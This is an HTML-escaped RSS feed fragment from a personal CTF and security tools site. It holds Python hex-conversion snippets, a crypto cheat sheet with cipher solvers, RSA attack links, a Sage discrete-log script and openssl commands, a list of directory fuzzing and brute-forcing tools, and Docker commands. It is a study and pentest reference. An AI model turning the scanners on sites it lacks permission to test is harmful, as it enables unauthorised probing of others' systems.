&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> binascii
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> binascii&lt;span style="color:#f92672">.&lt;/span>unhexlify(&lt;span style="color:#e6db74">&amp;#39;68656c6c6f&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> decode_hex &lt;span style="color:#f92672">=&lt;/span> codecs&lt;span style="color:#f92672">.&lt;/span>getdecoder(&lt;span style="color:#e6db74">&amp;#34;hex_codec&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> decode_hex(s)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>String $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> str&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;linuxhint&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> str&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;6c696e757868696e74&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex(String Type) $\to$ Decimal&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> int(a, &lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1193046&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Decimal $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1234&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> hex(a)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;0x4d2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex $\to$ Binary&lt;/p></description></item><item><title>Crypto Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/crypto-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/crypto-cheat-sheet/</guid><description>&lt;h1 id="crypto-cheat-sheet">
 Crypto Cheat Sheet
 &lt;a class="anchor" href="#crypto-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools---classic-crypto">
 Online Tools - Classic Crypto
 &lt;a class="anchor" href="#online-tools---classic-crypto">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Complex&lt;/th>
 &lt;th>Substitution Cipher&lt;/th>
 &lt;th>Vigenère Cipher&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://gchq.github.io/CyberChef/">CyberChef&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.boxentriq.com/code-breaking/cryptogram">Substitution Cipher Solver Tool&lt;/a>&lt;/td>
 &lt;td>Known Key &lt;/br>Python - &lt;code>pycipher&lt;/code> library&lt;/br>&lt;a href="https://planetcalc.com/2468/">online - Vigenère cipher&lt;/a>&lt;/br>CAP4&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://quipqiup.com/">quipqiup&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>Unknown Key&lt;/br>&lt;a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">Vigenère Cipher Codebreaker&lt;/a>&lt;/br>&lt;a href="https://www.guballa.de/vigenere-solver">Vigenere Solver&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="rsa相關攻擊">
 RSA相關攻擊
 &lt;a class="anchor" href="#rsa%e7%9b%b8%e9%97%9c%e6%94%bb%e6%93%8a">#&lt;/a>
&lt;/h2>
&lt;p>其實整裡的文章內容都差不多&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/84632">【技術分享】CTF中RSA的常見攻擊方法&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">Mod相關攻擊&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF RSA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="coding-tools">
 Coding Tools
 &lt;a class="anchor" href="#coding-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>大數運算: &lt;a href="https://blog.csdn.net/m0_52842062/article/details/117852175">gmpy2&lt;/a>/&lt;a href="https://cocalc.com/features/sage">sage math online - cocalc&lt;/a>/&lt;a href="https://sagecell.sagemath.org/">sage math online - sagecell&lt;/a>/&lt;a href="https://www.wolframalpha.com/">WolframAlpha&lt;/a>:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看&lt;a href="https://youtu.be/9JD3EzbAjH4?si=fmL7rOXK0u__Mf3u">這裡&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt install sagemath
# or
$ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl
---
# 想要在sage中安裝python library
$ sage -pip install {library name}
&lt;/code>&lt;/pre>:::spoiler To address Discrete Log Problem
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g2 &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,q)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(m2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m2)[&lt;span style="color:#ae81ff">2&lt;/span>:])
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>Crypto常用library: pycryptodom
&lt;code>$ pip install pycryptodome&lt;/code>
:::spoiler pycryptodome generate PEM file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; n &lt;span style="color:#f92672">=&lt;/span> 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; e &lt;span style="color:#f92672">=&lt;/span> 0x10001
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; d &lt;span style="color:#f92672">=&lt;/span> 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; p &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; q &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key_params &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>n, e, d, p, q&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key &lt;span style="color:#f92672">=&lt;/span> RSA.construct&lt;span style="color:#f92672">(&lt;/span>key_params&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f &lt;span style="color:#f92672">=&lt;/span> open&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;./rsaprivatekey.pem&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.write&lt;span style="color:#f92672">(&lt;/span>key.exportKey&lt;span style="color:#f92672">()&lt;/span>.decode&lt;span style="color:#f92672">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.close&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - RSA(很清楚)&lt;/a>
:::spoiler Cheat Sheet
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">&amp;#39;&amp;#39;&amp;#39;AES / DES&amp;#39;&amp;#39;&amp;#39;
$ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt)
$ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt)
$ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt)
$ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt)

&amp;#39;&amp;#39;&amp;#39;RSA&amp;#39;&amp;#39;&amp;#39;
$ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024
# (generate RSA private key)
$ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out
rsa_publickey.pem (generate RSA public key)
$ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt
# (use public key to encrpt)
$ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt

# To print out the components of a private key to standard output
$ openssl rsa -in key.pem -text -noout

# 把certificate轉成pem file
$ openssl openssl x509 -in cert -pubkey -noout
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

# 把單純public key的內容(n, e)(就是上面的東西)印出來
$ openssl rsa -pubin -in public.pem -text
RSA Public-Key: (53 bit)
Modulus: 4966306421059967 (0x11a4d45212b17f)
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

// 產出私鑰
openssl genrsa -out key.pem 2048

// 用同一把私鑰，產出兩組不同的憑證
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30

// 顯示公鑰是一樣
openssl x509 -pubkey -noout -in cert1.pem
openssl x509 -pubkey -noout -in cert2.pem

// 顯示憑證內容是不一樣
openssl x509 -inform pem -in cert2.pem
openssl x509 -inform pem -in cert1.pem
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="factoring-tools">
 Factoring Tools
 &lt;a class="anchor" href="#factoring-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://factordb.com/index.php">Factor DB&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/DarkenCode/yafu">Yafu&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.alpertron.com/ECM.HTM">Prime Factorization Online&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Directory Fuzzing/Traversal Tools</title><link>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/</guid><description>&lt;h1 id="directory-fuzzingtraversal-tools">
 Directory Fuzzing/Traversal Tools
 &lt;a class="anchor" href="#directory-fuzzingtraversal-tools">#&lt;/a>
&lt;/h1>
&lt;h2 id="according-survey-paper">
 According Survey Paper
 &lt;a class="anchor" href="#according-survey-paper">#&lt;/a>
&lt;/h2>
&lt;p>:::info
Aggarwal, V., Kaur, D., Mittal, S., Prasad, T. J. S., Batra, D., &amp;amp; Garg, A. (2023, August). A Comparative Study of Directory Fuzzing Tools. In 2023 International Conference on Circuit Power and Computing Technologies (ICCPCT) (pp. 1368-1374). IEEE.
:::
&lt;img src="https://hackmd.io/_uploads/rJ5oCY450.png" alt="圖片1-1" />&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/epi052/feroxbuster">feroxbuster&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/xmendez/wfuzz">Wfuzz&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/OJ/gobuster">gobuster&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sourceforge.net/projects/dirbuster/">Dirbuster&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-csdn-blog---推薦幾款優秀的目錄掃描工具">
 According to CSDN Blog - &lt;a href="https://blog.csdn.net/m0_60571842/article/details/131463420">推薦幾款優秀的目錄掃描工具&lt;/a>
 &lt;a class="anchor" href="#according-to-csdn-blog---%e6%8e%a8%e8%96%a6%e5%b9%be%e6%ac%be%e5%84%aa%e7%a7%80%e7%9a%84%e7%9b%ae%e9%8c%84%e6%8e%83%e6%8f%8f%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbscan-WebPathBrute&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/maurosoria/dirsearch">dirsearch&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/lijiejie/BBScan">BBScan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/VMsec/ihoneyBakFileScan_Modify">ihoneyBakFileScan_Modify&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-csdn-blog---滲透測試目錄掃描">
 According to CSDN Blog - &lt;a href="https://blog.csdn.net/m0_51191308/article/details/130440572">滲透測試|目錄掃描&lt;/a>
 &lt;a class="anchor" href="#according-to-csdn-blog---%e6%bb%b2%e9%80%8f%e6%b8%ac%e8%a9%a6%e7%9b%ae%e9%8c%84%e6%8e%83%e6%8f%8f">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/H4ckForJob/dirmap">DirMap&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/foryujian/yjdirscan">御劍&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-google">
 According to Google
 &lt;a class="anchor" href="#according-to-google">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/pmiaowu/PmWebDirScan">PmWebDirScan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/corunb/Dirscan">Dirscan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.csdn.net/qq_38612882/article/details/122648462">Dirb&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/maurosoria/dirsearch.git">Dirsearch&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/ffuf/ffuf">Ffuf&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docker Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/docker-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/docker-cheat-sheet/</guid><description>&lt;h1 id="docker-cheat-sheet">
 Docker Cheat Sheet
 &lt;a class="anchor" href="#docker-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-docker%e5%9f%ba%e7%a4%8e%e6%95%99%e5%ad%b8-7bbe3a351caf">Docker筆記 - Docker基礎教學&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e9%80%b2%e5%85%a5container-%e5%bb%ba%e7%ab%8b%e4%b8%a6%e6%93%8d%e4%bd%9c-postgresql-container-d221ba39aaec">Docker筆記 - 進入Container，建立並操作 PostgreSQL Container&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e6%9b%b4%e6%94%b9container%e7%9a%84configuration-5dc69d28a421">Docker筆記 - 更改Container的Configuration&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e8%ae%93%e8%b3%87%e6%96%99%e9%81%a0%e9%9b%a2container-%e4%bd%bf%e7%94%a8-volume-bind-mount-%e8%88%87-tmpfs-mount-6908da341d11">Docker筆記 - 讓資料遠離Container，使用 Volume、Bind Mount 與 Tmpfs Mount&lt;/a>
&lt;a href="https://matthung0807.blogspot.com/2020/12/docker-docker-compose-dockerfile-difference.html">Docker Docker Compose與Dockerfile差別 &lt;/a>
&lt;a href="https://osslab.tw/books/docker/page/docker-compose-%E6%8C%87%E4%BB%A4">Docker Compose 指令&lt;/a>&lt;/p>
&lt;h2 id="command">
 Command
 &lt;a class="anchor" href="#command">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.ibm.com/docs/en/workload-automation/9.5.0?topic=compose-accessing-docker-containers">Know docker container name&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ docker ps
# Then you&amp;#39;ll find the container name at the end of the result
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://matthung0807.blogspot.com/2020/10/docker-go-into-container-bash-shell.html">Go into container bash shell&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ docker exec -it &amp;lt;container_name&amp;gt; bash

# 以root的身份進入container
# 極度建議以此方法進入bash
$ docker exec -u root -it &amp;lt;container_id&amp;gt; /bin/bash
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Check Log
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose logs
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>啟動所有的 Docker Container 指令如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>停止 docker-compose 執行的所有 Container
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose stop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>刪除 docker-compose 的所有 Container
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose rm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Leave Container
&lt;code>exit or ctrl-D&lt;/code>&lt;/li>
&lt;li>利用Dockerfile build一個Images並且實際跑起來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker run -it --rm &lt;span style="color:#66d9ef">$(&lt;/span>docker build -q .&lt;span style="color:#66d9ef">)&lt;/span> /bin/sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
